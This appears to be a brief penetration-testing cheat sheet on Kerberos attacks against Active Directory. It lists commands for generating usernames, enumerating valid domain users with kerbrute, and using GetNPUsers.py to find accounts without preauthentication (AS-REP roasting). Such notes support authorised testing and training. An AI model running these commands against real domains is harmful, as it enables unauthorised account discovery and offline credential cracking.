# Kerberos

### User Discovery

_Compile usernames_

```
/opt/username-anarchy/username-anarchy --input-file ./test-names.txt
```

_Find valid users_

{% code overflow="wrap" %}
```
kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
```
{% endcode %}

### UF DONT REQUIRE PREAUTH

{% code overflow="wrap" %}
```
GetNPUsers.py $domain/ -no-pass -usersfile /path/to/names.txt -dc-ip $ip
```
{% endcode %}
